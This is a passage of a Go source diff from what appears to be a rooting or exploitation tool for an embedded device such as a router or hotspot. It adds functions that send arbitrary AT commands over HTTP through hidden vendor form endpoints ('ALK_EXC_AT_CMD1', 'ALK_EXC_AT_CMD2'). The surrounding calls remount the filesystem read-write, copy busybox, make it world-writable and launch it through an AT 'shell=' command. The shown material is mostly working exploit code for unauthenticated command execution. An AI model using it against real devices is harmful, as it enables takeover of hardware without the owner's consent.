@@ -41,6 +41,30 @@ func (e *Executer) runCmd(cmd string) {
 	log.Println(string(bodyBytes))
 }
 
+func (e *Executer) runAT1(cmd string) {
+	resp, err := http.Get(fmt.Sprintf("http://%s/reqproc/proc_post?goformId=ALK_EXC_AT_CMD1&AT_CMD1=%s", e.IP, url.QueryEscape(cmd)))
+	if err != nil {
+		log.Fatal(err)
+	}
+	bodyBytes, err := io.ReadAll(resp.Body)
+	if err != nil {
+		log.Fatal(err)
+	}
+	log.Println(string(bodyBytes))
+}
+
+func (e *Executer) runAT2(cmd string) {
+	resp, err := http.Get(fmt.Sprintf("http://%s/reqproc/proc_post?goformId=ALK_EXC_AT_CMD2&AT_CMD2=%s", e.IP, url.QueryEscape(cmd)))
+	if err != nil {
+		log.Fatal(err)
+	}
+	bodyBytes, err := io.ReadAll(resp.Body)
+	if err != nil {
+		log.Fatal(err)
+	}
+	log.Println(string(bodyBytes))
+}
+
 func (e *Executer) Remount() {
 	e.runCmd("mount -o remount,rw " + targetPath)
 	e.runCmd("cp /bin/busybox " + targetFile)
@@ -64,7 +88,8 @@ func (e *Executer) Push() {
 
 func (e *Executer) Enable() {
 	e.runCmd("chmod 777 " + targetFile)
-	e.runCmd(targetFile)
+	//e.runCmd("/bin/sh -c " + targetFile + " &")
+	e.runAT1("shell="+targetFile)
 }
 
 func start(ip string, onlyStart bool) {
